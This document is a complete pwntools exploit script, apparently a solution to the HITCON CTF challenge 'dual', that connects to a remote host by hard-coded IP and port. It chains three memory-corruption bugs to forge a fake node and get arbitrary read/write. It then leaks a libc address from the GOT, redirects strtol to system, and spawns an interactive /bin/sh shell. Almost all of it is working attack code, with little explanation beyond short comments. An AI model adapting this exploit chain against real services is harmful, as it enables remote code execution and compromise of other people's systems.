#!/usr/bin/env python3
from pwn import *


def connect():
    if args.LOCAL:
        return gdb.debug(['./dual.dbg'], api=True)
    else:
        return remote('13.231.226.137', 9573)


def op(tube, n):
    tube.recvuntil(b'op>\n')
    tube.sendline(str(n))


def create_node(tube, pred_id):
    op(tube, 1)
    tube.recvuntil(b'pred_id>\n')
    tube.sendline(str(pred_id))
    return int(tube.recvline())


def write_text(tube, node_id, text):
    op(tube, 4)
    tube.recvuntil(b'node_id>\n')
    tube.sendline(str(node_id))
    tube.recvuntil(b'text_len>\n')
    tube.sendline(str(len(text)))
    tube.recvuntil(b'text>\n')
    if len(text) > 0:
        tube.send(text)


def write_bin(tube, node_id, bin):
    op(tube, 5)
    tube.recvuntil(b'node_id>\n')
    tube.sendline(str(node_id))
    tube.recvuntil(b'bin_len>\n')
    tube.sendline(str(len(bin)))
    tube.recvuntil(b'bin>\n')
    if len(bin) > 0:
        tube.send(bin)


def read_text(tube, node_id):
    op(tube, 6)
    tube.recvuntil(b'node_id>\n')
    tube.sendline(str(node_id))


def gc(tube):
    op(tube, 7)


ROOT_ID = 0
SIZEOF_ENCODED = 0x10
SIZEOF_NODE = 0x40
FAKE_NODE_ID = 666
FAKE_POOL_IDX = 8
MALLOC_OVERHEAD = 0x10
GOT_ADDR = 0x519000
POOL_OFFSET = SIZEOF_NODE + MALLOC_OVERHEAD
FAKE_TEXT_LEN = 0x100
STRTOL_GOT_OFFSET = 0x68
STRTOL_LIBC_OFFSET = 0x4bc20
SYSTEM_LIBC_OFFSET = 0x55410


def main():
    with connect() as tube:
        if args.LOCAL and not args.NOPTRACE:
            tube.gdb.execute('set pagination off')
            tube.gdb.continue_nowait()

        # Bug part 1: write_bin() sets pool.begin[node->text_pool_idx] = 0x1.
        write_bin(tube, ROOT_ID, b'')
        # Bug part 2: add_pool() reuses pool entries that are <= 0x7.
        create_node(tube, 0)
        # Bug part 3: write_text() preserves pool indices.
        # This allows us to forge root node's successor.
        write_text(tube, ROOT_ID, struct.pack(
            '<QQQQQQQQ',
            FAKE_NODE_ID,  # id
            0,  # self_pool_idx
            0,  # succ_pool_idxes.begin
            0,  # succ_pool_idxes.end
            0,  # succ_pool_idxes.limit
            FAKE_TEXT_LEN,  # text_len
            FAKE_POOL_IDX,  # text_pool_idx
            0,  # stamp
        ))

        # Realloc pool so that it comes right after fake node's text.
        for _ in range(FAKE_POOL_IDX - 1):
            create_node(tube, 0)

        # Read pool.
        read_text(tube, FAKE_NODE_ID)
        pool = tube.recvn(FAKE_TEXT_LEN)

        # Point the fake pool entry to GOT.
        pool = bytearray(pool)
        pool[POOL_OFFSET + FAKE_POOL_IDX * 8:
             POOL_OFFSET + (FAKE_POOL_IDX + 1) * 8] = \
            struct.pack('<Q', GOT_ADDR)
        write_text(tube, FAKE_NODE_ID, pool)

        # Read GOT.
        read_text(tube, FAKE_NODE_ID)
        got = tube.recvn(FAKE_TEXT_LEN)
        strtol, = struct.unpack(
            '<Q', got[STRTOL_GOT_OFFSET:STRTOL_GOT_OFFSET + 8])
        print(f'strtol = 0x{strtol:x}')
        libc = strtol - STRTOL_LIBC_OFFSET
        print(f'libc = 0x{libc:x}')
        assert libc & 0xfff == 0

        # Point strtol to system.
        got = bytearray(got)
        got[STRTOL_GOT_OFFSET:STRTOL_GOT_OFFSET + 8] = \
            struct.pack('<Q', libc + SYSTEM_LIBC_OFFSET)
        write_text(tube, FAKE_NODE_ID, got)

        # Go!
        op(tube, '/bin/sh\0')
        tube.interactive()  # hitcon{UnE_ta1e_0F_ru2T_und_C#}


if __name__ == '__main__':
    main()
